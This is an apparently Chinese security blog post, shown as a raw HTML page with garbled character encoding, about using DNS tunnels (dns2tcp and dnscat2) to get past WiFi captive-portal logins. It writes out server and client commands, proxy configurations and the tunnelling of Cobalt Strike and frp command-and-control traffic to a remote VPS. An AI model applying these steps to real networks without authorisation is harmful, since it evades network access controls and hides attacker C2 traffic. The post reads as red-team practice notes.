<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>è®°ä¸€æ¬¡ç»•è¿‡WIFIè®¤è¯çš„DNSéš§é“ | c0ys</title>
<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="è®°ä¸€æ¬¡ç»•è¿‡WIFIè®¤è¯çš„DNSéš§é“ | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta name="robots" content="nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="baiduspider" content="noindex, nofollow">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">




<script>
  fetch('https://v1.hitokoto.cn')
    .then(response => response.json())
    .then(data => {
      const hitokoto = document.getElementById('hitokoto_text')
      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      hitokoto.innerText = data.hitokoto
    })
    .catch(console.error)
</script>

<script>
  var _hmt = _hmt || [];
  (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
  })();
</script>
  
    <meta name="description" content="å‰è¨€
èµ·å› æ˜¯æŸæ¬¡æµ‹è¯•ç›®æ ‡å¤šäº†ä¸€ä¸ªwifiï¼Œæƒ³èµ·ä¹‹å‰çš„è¿‘æºwifiå½“ä¸­å­˜åœ¨ä¸å°‘è®¤è¯ç•Œé¢ï¼Œæ‰æƒ³ç€èƒ½ä¸èƒ½ç»•è¿‡wifiè®¤è¯ç•Œé¢ã€‚ä¸”çº¢è“å¯¹æŠ—ä¸­TCPä¸å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œèµ°dnséš§é“æœ‰æ—¶ä¹Ÿæ˜¯å¥‡æ•ˆã€‚
å…³äºdnséš§é“ç›¸å…³å·¥å…·ä¸»æµæ‰¾åˆ°çš„å°±3ç§ï¼Œdnscat2ã€i..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://c0ys.cn">
  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
  </a>
  <h1 class="site-title">
    c0ys
  </h1>
  <p class="site-description" id="hitokoto">
    <a id="hitokoto_text"> å¾å¿ƒå¾è¡Œæ¾„å¦‚æ˜é•œï¼Œæ‰€ä½œæ‰€ä¸ºçš†ä¸ºæ­£ä¹‰ã€‚</a>
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="https://c0ys.cn/post/about" class="menu">
          å…³äº
        </a>
      
    
      
        <a href="https://c0ys.cn/post/talk" class="menu">
          ç•™è¨€
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              è®°ä¸€æ¬¡ç»•è¿‡WIFIè®¤è¯çš„DNSéš§é“
            </h2>
            <div class="post-info">
              <span>
                2022-06-10
              </span>
              <span>
                9 min read
              </span>
              
            </div>
            
              <img class="post-feature-image" src="https://bu.dusays.com/2022/06/10/62a3063c49210.png" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h1 id="å‰è¨€">å‰è¨€</h1>
<p>èµ·å› æ˜¯æŸæ¬¡æµ‹è¯•ç›®æ ‡å¤šäº†ä¸€ä¸ªwifiï¼Œæƒ³èµ·ä¹‹å‰çš„è¿‘æºwifiå½“ä¸­å­˜åœ¨ä¸å°‘è®¤è¯ç•Œé¢ï¼Œæ‰æƒ³ç€èƒ½ä¸èƒ½ç»•è¿‡wifiè®¤è¯ç•Œé¢ã€‚ä¸”çº¢è“å¯¹æŠ—ä¸­TCPä¸å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œèµ°dnséš§é“æœ‰æ—¶ä¹Ÿæ˜¯å¥‡æ•ˆã€‚</p>
<p>å…³äºdnséš§é“ç›¸å…³å·¥å…·ä¸»æµæ‰¾åˆ°çš„å°±3ç§ï¼Œdnscat2ã€iodineã€dns2tcpï¼Œå¦‚ä¸‹æ—¶é—´é—®é¢˜ï¼Œåªç®€å•è¯•æ¢äº†å…¶ä¸­ä¸¤ç§ã€‚</p>
<blockquote>
<p>VPSè®°å¾—å¼€é˜²ç«å¢™å¼€UDPï¼Œæˆ‘é»˜è®¤ä¹‹å‰ç­–ç•¥åªå¼€äº†å…¨ç«¯å£TCPï¼Œæ’é”™äº†å¾ˆä¹…æ‰çŸ¥é“ã€‚</p>
</blockquote>
<h1 id="åŸŸåé…ç½®">åŸŸåé…ç½®</h1>
<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/06/10/62a305bac21ab.png" alt="" loading="lazy"></figure>
<table>
<thead>
<tr>
<th>ä¸»æœºè®°å½•</th>
<th>è®°å½•ç±»å‹</th>
<th>è®°å½•å€¼</th>
</tr>
</thead>
<tbody>
<tr>
<td>dns2tcp</td>
<td>NS</td>
<td>ns.lyuan.ink</td>
</tr>
<tr>
<td>ns</td>
<td>A</td>
<td>43.1.1.1</td>
</tr>
</tbody>
</table>
<h2 id="é”™è¯¯åˆ¤æ–­">é”™è¯¯åˆ¤æ–­</h2>
<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/05/23/628b4a83735de.png" alt="" loading="lazy"></figure>
<blockquote>
<p>æ³¨æ„nsè§£æï¼Œæ˜¯digã€nslookupç›´è§‚ä¸Šçœ‹ä¸äº†äº†ï¼Œä¸çŸ¥é“ä¸ºä½•ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´ä»¥ä¸ºnsè§£æä¸ç”Ÿæ•ˆï¼Œè¿·æƒ‘äº†å¾ˆä¹…ï¼Œå†·é™ä¸‹åçœ‹äº†ç¯‡æ–‡ç« æŠ“åŒ…53æ¥åˆ¤æ–­ï¼Œç›´æ¥è§£æƒ‘ã€‚</p>
</blockquote>
<h2 id="æ­£ç¡®åˆ¤æ–­">æ­£ç¡®åˆ¤æ–­</h2>
<pre><code class="language-python">tcpdump -n -i eth0 udp dst port 53
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/05/23/628b4a8927c61.png" alt="" loading="lazy"></figure>
<h1 id="dns2tcp">dns2tcp</h1>
<p><a href="https://github.com/alex-sector/dns2tcp" title="https://github.com/alex-sector/dns2tcp">https://github.com/alex-sector/dns2tcp</a></p>
<p>é»˜è®¤æ²¡æœ‰windowsç«¯ï¼Œè‡ªå·±æ‰¾äººå®¶ç¼–è¯‘å¥½çš„ã€‚</p>
<figure data-type="image" tabindex="4"><img src="https://bu.dusays.com/2022/05/23/628b4cfc52928.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œsocks5è½¬å‘ç”¨çš„dantedï¼Œå¦‚æœä¸ç”¨socks5è½¬å‘æµé‡çš„è¯ï¼Œæˆ‘ä»¬å®¢æˆ·ç«¯çš„æµé‡åªèƒ½è®¿é—®åˆ°æˆ‘ä»¬çš„VPSã€‚</p>
<h2 id="æœåŠ¡ç«¯">æœåŠ¡ç«¯</h2>
<pre><code class="language-python">dns2tcpd -f dns2tcpd.conf -F -d 2

-f æŒ‡å®šäº†é…ç½®æ–‡ä»¶
-F è¦æ±‚ç¨‹åºåœ¨å‰å°è¿è¡Œ
-d 2æŒ‡æ˜äº†è¾“å‡ºè°ƒè¯•ä¿¡æ¯ï¼Œçº§åˆ«ä¸º2


# é…ç½®æ–‡ä»¶
listen = 0.0.0.0
port = 53
user = nobody
chroot = /tmp
domain = dns2tcp.lyuan.ink
resources = ssh:43.1.x.x:22,socks:43.1.x.x:7777

</code></pre>
<p>è¿™é‡Œçš„é…ç½®æ–‡ä»¶ï¼Œç½‘ä¸Šä¹Ÿæ²¡å‡ ä¸ªäººæ•™ç¨‹è¯´æ˜ç™½ï¼Œä¹Ÿæ˜¯è¯•é”™äº†å¾ˆä¹…ï¼Œåœ¨ä¸€æ¬¡æ¢¦ä¸­çªç„¶ç†æ¸…ï¼Œå®é™…ä¸Šè¿™ä¸ªsshå’Œè¿™ä¸ªsocksåªæ˜¯ç›¸å½“äºä¸€ç§è‡ªå·±è‡ªå®šä¹‰æ¨¡å¼ï¼Œå…¶ä¸­æŒ‡å®šçš„ç«¯å£ï¼Œä¼šåœ¨å®¢æˆ·ç«¯<code>-l</code>å‚æ•°æŒ‡å®šè½¬å‘å‡ºå»ã€‚</p>
<p>ä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯çš„<code>-z ssh -l 1080 </code>ï¼Œå°±æ˜¯æŠŠvpsçš„22ç«¯å£æ˜ å°„åˆ°1080ä¸Šï¼Œåˆ°æ—¶å€™å®¢æˆ·ç«¯è¿æ¥çš„æ—¶å€™ç›´æ¥<code>ssh root@127.0.0.1 -p 1080</code>å°±è¡Œã€‚</p>
<p>åä¹‹<code>-z socks -l 1080 </code>ï¼Œproxiferåšå¥½è½¬å‘æŠŠæœ¬åœ°çš„1080è½¬åˆ°vpsçš„7777socksï¼Œä¸€å®šè¦é…åˆdantedå†æŠŠvpsçš„7777æµé‡è½¬å‘å‡ºå»ï¼Œæ‰èƒ½ä¸Šç½‘ï¼Œæ‰èƒ½ä¸äº’è”ç½‘é€šä¿¡ã€‚</p>
<h2 id="socks5è½¬å‘">socks5è½¬å‘</h2>
<p>2022å¹´ï¼Œåˆ«ç”¨ç½‘ä¸Šç²—åˆ¶æ»¥é€ çš„ï¼Œé€šç¯‡ä¸€æ ·çš„æ•™ç¨‹äº†ï¼Œç½‘ä¸Šé€šç¯‡éƒ½æ˜¯dantedï¼Œä¸å¥½è£…ä¸å¥½è¯´ï¼Œè¿˜è¦é…ç½®æ–‡ä»¶ï¼Œè¿™è¾¹æ¨èç”¨proxyã€‚</p>
<h3 id="proxy-æ¨è">proxy  [æ¨è]</h3>
<blockquote>
<p>ä¸€è¡Œå‘½ä»¤è§£å†³ï¼Œæ²¡æœ‰ä¸‹é¢danted/sockdé‚£ä¹ˆå¤šäº‹ã€‚</p>
</blockquote>
<p><a href="https://github.com/snail007/goproxy/blob/master/README_ZH.md" title="https://github.com/snail007/goproxy/blob/master/README_ZH.md">https://github.com/snail007/goproxy/blob/master/README_ZH.md</a></p>
<pre><code class="language-python">./proxy socks -t tcp -p &quot;0.0.0.0:7777&quot; --udp-port 0 --udp
</code></pre>
<h3 id="danted-ç¹ç">danted [ç¹ç]</h3>
<p>ç”±äºæˆ‘æ˜¯centosï¼Œé»˜è®¤æ²¡è¿™ä¸ªåŒ…ï¼Œä¹Ÿæ˜¯è´¹äº†è€å¤§å…«å°½æ‰è£…ä¸Šï¼Œè‡ªå·±å¯åŠ¨å§ã€‚</p>
<p>çœ‹å®Œäº†ç½‘ä¸Šçš„é€šç¯‡è®²ä¸æ¸…çš„ç½‘ç»œåƒåœ¾åæƒ³åğŸ¤®äº†ï¼Œä¸å¦‚å®˜æ–¹wikiï¼Œæ†‹ç€çœ‹è‹±æ–‡éƒ½æ¯”è¿™å¥½ã€‚</p>
<ul>
<li>
<p><a href="https://zhuanlan.zhihu.com/p/65094630" title="https://zhuanlan.zhihu.com/p/65094630">https://zhuanlan.zhihu.com/p/65094630</a></p>
</li>
<li>
<p><a href="http://www.inet.no/dante/doc/latest/config/server.html" title="http://www.inet.no/dante/doc/latest/config/server.html">http://www.inet.no/dante/doc/latest/config/server.html</a></p>
</li>
</ul>
<p>ç”±äºé…ç½®æ–‡ä»¶ä¸å¯¹ï¼Œæ’é”™å¾ˆä¹…ï¼Œæ€è·¯ä¸»è¦æ˜¯å¦‚ä¸‹ï¼Œå¸Œæœ›ä»¥åè‡ªå·±çœ‹åˆ°èƒ½æƒ³èµ·ä¸€äº›ã€‚</p>
<pre><code class="language-python">sockd -V
tail /var/log/sockd.log æ ¹æ®é”™è¯¯æ—¥å¿—æ£€æŸ¥é…ç½®æ–‡ä»¶ï¼Œç›´åˆ°çœ‹è§å¦‚ä¸‹ã€‚
--------------
May 23 14:30:28 sockd[3835119]: info: Dante/server[1/1] v1.4.2 running
---------------
æ¥ç€æŸ¥çœ‹ç«¯å£æ˜¯å¦ç›‘å¬å½“ä¸­
netstat -ano|grep 7777
å†ä¿å®ˆä¸€ç‚¹æŠ“åŒ…çœ‹çœ‹
tcpdump port 7777

</code></pre>
<pre><code class="language-python">Dante v1.4.2.  Copyright (c) 1997 - 2014, Inferno Nettverk A/S, Norway.
usage: sockd [-DLNVdfhnv]
   -D             : run in daemon mode
   -L             : shows the license for this program
   -N &lt;number&gt;    : fork of &lt;number&gt; servers [1]
   -V             : verify configuration and exit
   -d &lt;number&gt;    : set degree of debugging
   -f &lt;filename&gt;  : use &lt;filename&gt; as configuration file [/etc/sockd.conf]
   -h             : print this information
   -n             : disable TCP keep-alive
   -p &lt;filename&gt;  : write pid to &lt;filename&gt; [/var/run/sockd.pid]
   -v             : print version info
</code></pre>
<p>é…ç½®æ–‡ä»¶</p>
<pre><code class="language-python">logoutput: /var/log/sockd.log
internal: eth0 port = 7777
external: eth0
socksmethod: username none
user.privileged: root
user.unprivileged: nobody
client pass {
    from: 0.0.0.0/0 port 1-65535 to: 0.0.0.0/0
}
socks pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    protocol: tcp udp
}
</code></pre>
<h2 id="å®¢æˆ·ç«¯">å®¢æˆ·ç«¯</h2>
<pre><code class="language-python">dns2tcpc.exe -r socks -z dns2tcp.lyuan.ink 43.1.x.x -l 1080 -d 3
dns2tcpc -r ssh -z dns2tcp.lyuan.ink 43.1.x.x -l 1080 -d 3

dns2tcp v0.5.2 ( http://www.hsc.fr/ )
Usage : dns2tcpc.exe [options] [server]
        -c              : enable compression
        -z &lt;domain&gt;     : domain to use (mandatory)
         åæ¥ä½ è®¾ç½®çš„NSè®°å½•,å’Œä½ çš„VPSå…¬ç½‘ip  &lt;å…¬ç½‘ip&gt; å¯ä¸å¡«ï¼Œä¸å†™å°†ä½¿ç”¨ä¸­ç»§æ¨¡å¼ï¼Œå¦åˆ™ä½¿ç”¨ç›´è¿æ¨¡å¼
         ä¸­ç»§æ¨¡å¼åƒæˆ‘ä»¬å¹³æ—¶ä¸Šç½‘ä¸€æ ·ï¼ŒDNSè§£æå…ˆç»è¿‡äº’è”ç½‘çš„è¿­ä»£è§£æï¼Œæœ€åæŒ‡å‘æˆ‘ä»¬çš„æ¶æ„DNSæœåŠ¡å™¨ã€‚ç›¸æ¯”ç›´è¿ï¼Œé€Ÿåº¦è¾ƒæ…¢ï¼Œä½†æ˜¯æ›´å®‰å…¨ã€‚
        -d &lt;1|2|3&gt;      : debug_level (1, 2 or 3)
        -r &lt;resource&gt;   : resource to access
        -k &lt;key&gt;        : pre-shared key
        -f &lt;filename&gt;   : configuration file
        -l &lt;port&gt;     : local port to bind (mandatory if resource defined without program )
        -e &lt;program&gt;    : program to execute
        -t &lt;delay&gt;      : max DNS server's answer delay in seconds (default is 3)
        -T &lt;TXT|KEY&gt;    : DNS request type (default is TXT)
        server  : DNS server to use

</code></pre>
<figure data-type="image" tabindex="5"><img src="https://bu.dusays.com/2022/05/23/628b4a9268ff0.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://bu.dusays.com/2022/06/10/62a30617e1b0a.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://bu.dusays.com/2022/06/10/62a30622ce96d.png" alt="" loading="lazy"></figure>
<h3 id="ä¸Šçº¿cs">ä¸Šçº¿cs</h3>
<blockquote>
<p>å¯ä»¥ç›´æ¥èµ°dnsçš„listenerä¸Šçº¿ï¼Œä½†å¥½åƒå¾ˆéº»çƒ¦çš„æ ·å­ã€‚</p>
</blockquote>
<p>æˆ‘çš„æƒ³æ³•æ˜¯ç±»ä¼¼äºä¸Šé¢çš„sshï¼Œå°†æœ¬åœ°çš„8002ç›‘å¬ï¼Œè½¬å‘åˆ°å…¬ç½‘çš„listenerç«¯å£ä¸Šå³å¯ï¼Œèµ°ä¸€ä¸ªtcpç«¯å£è½¬å‘å³å¯ï¼Œç„¶åä¸Šçº¿æœ¬åœ°çš„8002ç«¯å£ã€‚</p>
<p>ä¿®æ”¹dns2tcpé…ç½®æ–‡ä»¶åŠ ä¸Šä¸€æ¡ã€‚</p>
<pre><code class="language-python">resources = cs:43.1.x.x:9999
</code></pre>
<pre><code class="language-python">dns2tcpc.exe -r cs -z dns2tcp.lyuan.ink 43.1.x.x -l 8002 -d 3
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://bu.dusays.com/2022/06/10/62a3062c1042c.png" alt="" loading="lazy"></figure>
<p>æ„Ÿå—ï¼š</p>
<ul>
<li>
<p>csçš„ä¸Šçº¿ä¸ç¨³å®š</p>
<p>ã€Œè€é—®é¢˜ï¼Œç”¨ä¸¤å°vpså°±å¥½äº†ï¼Œå› ä¸ºæ­¤æ—¶dnsæœåŠ¡å™¨ï¼ŒcsæœåŠ¡å™¨éƒ½è¦äº¤äº’ï¼Œæœ¬åœ°ç½‘é€Ÿæ›´ä¸ä¸Šï¼Œä¼šå‡ºç°ICMPéš§é“æ­å»ºä¸€æ ·çš„é—®é¢˜ã€‚<strong>æ‰€æœ‰æµé‡éƒ½èµ°äº†ä¸€ä¸ªå‡ºå£ï¼Œå¯¼è‡´çš„å»¶è¿Ÿã€</strong></p>
</li>
<li>
<p>æ…ç”¨artifactï¼Œä¸€å¼€éš§é“å®¹æ˜“å´©ï¼Œå¹¶å‘å¤ªå¤§ï¼Œå»ºè®®artifact/beaconåªç”¨ä¸€ä¸ªã€‚</p>
</li>
<li>
<p>å¾ˆå¡ï¼Œç™¾åº¦éƒ½æ‰“ä¸å¼€ï¼Œåªè¦å¹¶å‘ä¸€å¤šå°±ç›´æ¥å´©ï¼Œ5Gæ‰“å¼€ç½‘é¡µä¹Ÿæ˜¯å¾ˆæ…¢çš„æ„Ÿè§‰ï¼Œåªèƒ½æ‰“å¼€ä¸€ä¸‹ï¼Œä¹Ÿå°±èƒ½æˆªä¸ªå›¾ï¼Œå±äºæ˜¯ä¸èƒ½ç”¨çš„é‚£ç§ã€‚</p>
<p>ã€Œè¿‡ä¸€édnsåè®®å†èµ°socksè½¬å‘å‡ºå»ï¼Œå†è®¿é—®äº’è”ç½‘çš„èµ„æºï¼Œå¡å¥½åƒå¾ˆæ­£å¸¸ï¼Œä½†æŒ‚ç€frpè®¿é—®å†…ç½‘èµ„æºè²Œä¼¼å¾ˆæµç•…ã€‚ã€</p>
</li>
</ul>
<h3 id="ä¸Šçº¿frp">ä¸Šçº¿frp</h3>
<p>æ­¤å¤„éœ€è¦åœ¨ä¸Šè¿°æœåŠ¡å™¨å»ºç«‹å¥½socks5è½¬å‘åï¼Œæ‰èƒ½ã€‚</p>
<p>å®¢æˆ·ç«¯dns2cat 1080 ç«¯å£ â€”&gt; vpsçš„socks 7777ç«¯å£ â€”&gt; vpsè½¬å‘7777 å‡ºå»æ‰èƒ½å¤Ÿä¸Šç½‘</p>
<p>åšæ³•ä¹Ÿå¾ˆç®€å•ï¼Œfrpcçš„é…ç½®æ–‡ä»¶åŠ ä¸€æ¡ã€‚</p>
<pre><code class="language-python">[common]
http_proxy = socks5://127.0.0.1:1080
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://bu.dusays.com/2022/06/10/62a3063c49210.png" alt="" loading="lazy"></figure>
<p>ç¨³å®šæ€å¯†è¾¾ã€‚</p>
<figure data-type="image" tabindex="10"><img src="https://bu.dusays.com/2022/06/10/62a30648f1d4d.png" alt="" loading="lazy"></figure>
<p><strong>æ„Ÿå—ï¼š</strong></p>
<ul>
<li>æŒºå¿«çš„ã€‚</li>
</ul>
<h1 id="dnscat2">dnscat2</h1>
<p><a href="https://github.com/iagox86/dnscat2" title="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
<p>å»ºè®®æœåŠ¡ç«¯è‡ªå·±ç¼–è¯‘ï¼Œå…¶ä»–å¹³å°å®¢æˆ·ç«¯è¿™é‡Œä¸‹è½½ï¼š</p>
<p><a href="https://downloads.skullsecurity.org/dnscat2/" title="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
<ul>
<li>
<p>rubyç¯å¢ƒä½ å¯èƒ½æ­å»ºä¼šè¸©å·¨å¤šå‘ï¼Œå®¢æˆ·ç«¯cå†™çš„è¦ç¼–è¯‘ï¼ŒæœåŠ¡ç«¯rubyå†™çš„ã€‚</p>
</li>
<li>
<p>ä½†å®æˆ˜ç”¨èµ·æ¥å°±æ˜¯ä¸ªc2ï¼Œèƒ½å‘½ä»¤æ‰§è¡Œï¼Œä½†éš§é“æ–¹é¢æä¾›çš„è²Œä¼¼åªæœ‰ä¸€ä¸ªç«¯å£è½¬å‘ã€‚</p>
</li>
<li>
<p><strong>ä¸éœ€è¦åŸŸåå³å¯ï¼Œæ—¶é—´ä¸å¤šï¼Œè¿™æ¬¡æ²¡æœ‰æ·±å…¥ã€‚</strong></p>
</li>
</ul>
<h2 id="rubyç¯å¢ƒè¸©å‘">rubyç¯å¢ƒè¸©å‘</h2>
<pre><code class="language-python"># æ¢æº
gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/
# å®‰è£…
bundle install
# ä¸å‡ºæ„å¤–ä¼šæŠ¥é”™
å¥½å‡ ä¸ªæŠ¥é”™ï¼Œå†™æ–‡ç« çš„æ—¶å€™åˆæƒ³ä¸èµ·æ¥äº†ï¼Œä½†éƒ½åœ¨stackoverflow.comæ‰¾åˆ°äº†ç­”æ¡ˆã€‚
</code></pre>
<h2 id="æœåŠ¡ç«¯-2">æœåŠ¡ç«¯</h2>
<p>èµ·æ‰‹ç›´æ¥</p>
<pre><code class="language-python">ruby dnscat2.rb

</code></pre>
<p>å®¢æˆ·ç«¯è¿æ¥ä¿¡æ¯éƒ½åœ¨å¦‚ä¸‹æç¤ºä¿¡æ¯é‡Œé¢</p>
<pre><code class="language-python">New window created: 0
dnscat2&gt; New window created: crypto-debug
[DEPRECATION] The trollop gem has been renamed to optimist and will no longer be supported. Please switch to optimist as soon as possible.
Welcome to dnscat2! Some documentation may be out of date.

auto_attach =&gt; false
history_size (for new windows) =&gt; 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = n/a]...

It looks like you didn't give me any domains to recognize!
That's cool, though, you can still use direct queries,
although those are less stealthy.

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=9e96192a779f3978e9dd5d64cf733e39

Of course, you have to figure out &lt;server&gt; yourself! Clients
will connect directly on UDP port 53.
</code></pre>
<h2 id="å®¢æˆ·ç«¯-2">å®¢æˆ·ç«¯</h2>
<p>ä¸ä¼šå°±-hï¼Œçœ‹githubï¼Œæ²¡ä»€ä¹ˆæ—¶é—´è¿™é‡Œå†™çš„å¾ˆä»“ä¿ƒã€‚</p>
<figure data-type="image" tabindex="11"><img src="https://bu.dusays.com/2022/05/23/628b4ad422c0d.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://bu.dusays.com/2022/05/23/628b4addbf30a.png" alt="" loading="lazy"></figure>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<ul>
<li><a href="https://blog.csdn.net/deng_xj/article/details/88834124" title="https://blog.csdn.net/deng_xj/article/details/88834124">https://blog.csdn.net/deng_xj/article/details/88834124</a></li>
</ul>

                <blockquote>
                  <p>å£°æ˜ï¼šæœ¬åšå®¢æ–‡ç« æ‰€åˆ†äº«å†…å®¹ä»…ç”¨äºæŠ€æœ¯äº¤æµï¼Œç¦æ­¢ç”¨äºè¿æ³•é€”å¾„ï¼Œæ‰€æœ‰æ¸—é€éƒ½éœ€è·å–æˆæƒï¼å¦åˆ™éœ€è‡ªè¡Œæ‰¿æ‹…ï¼Œæœ¬ç«™åŠåŸä½œè€…ä¸æ‰¿æ‹…ç›¸åº”çš„åæœã€‚</p>
                </blockquote>
              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E5%89%8D%E8%A8%80">å‰è¨€</a></li>
<li><a href="#%E5%9F%9F%E5%90%8D%E9%85%8D%E7%BD%AE">åŸŸåé…ç½®</a>
<ul>
<li><a href="#%E9%94%99%E8%AF%AF%E5%88%A4%E6%96%AD">é”™è¯¯åˆ¤æ–­</a></li>
<li><a href="#%E6%AD%A3%E7%A1%AE%E5%88%A4%E6%96%AD">æ­£ç¡®åˆ¤æ–­</a></li>
</ul>
</li>
<li><a href="#dns2tcp">dns2tcp</a>
<ul>
<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF">æœåŠ¡ç«¯</a></li>
<li><a href="#socks5%E8%BD%AC%E5%8F%91">socks5è½¬å‘</a>
<ul>
<li><a href="#proxy-%E6%8E%A8%E8%8D%90">proxy  [æ¨è]</a></li>
<li><a href="#danted-%E7%B9%81%E7%90%90">danted [ç¹ç]</a></li>
</ul>
</li>
<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF">å®¢æˆ·ç«¯</a>
<ul>
<li><a href="#%E4%B8%8A%E7%BA%BFcs">ä¸Šçº¿cs</a></li>
<li><a href="#%E4%B8%8A%E7%BA%BFfrp">ä¸Šçº¿frp</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dnscat2">dnscat2</a>
<ul>
<li><a href="#ruby%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91">rubyç¯å¢ƒè¸©å‘</a></li>
<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF-2">æœåŠ¡ç«¯</a></li>
<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-2">å®¢æˆ·ç«¯</a></li>
</ul>
</li>
<li><a href="#%E5%8F%82%E8%80%83">å‚è€ƒ</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://c0ys.cn/post/uVSYQlRm2/">
              <h3 class="post-title">
                è®°ä¸€æ¬¡ä¸¥è‹›ç¯å¢ƒçš„ICMPéš§é“
              </h3>
            </a>
          </div>
        
      
        
            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>

<div id="tcomment"></div>
<script>
twikoo.init({
  envId: 'https://talk.c0ys.cn',
  el: '#tcomment'
})
</script> 
          

        

        <div class="site-footer">
  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
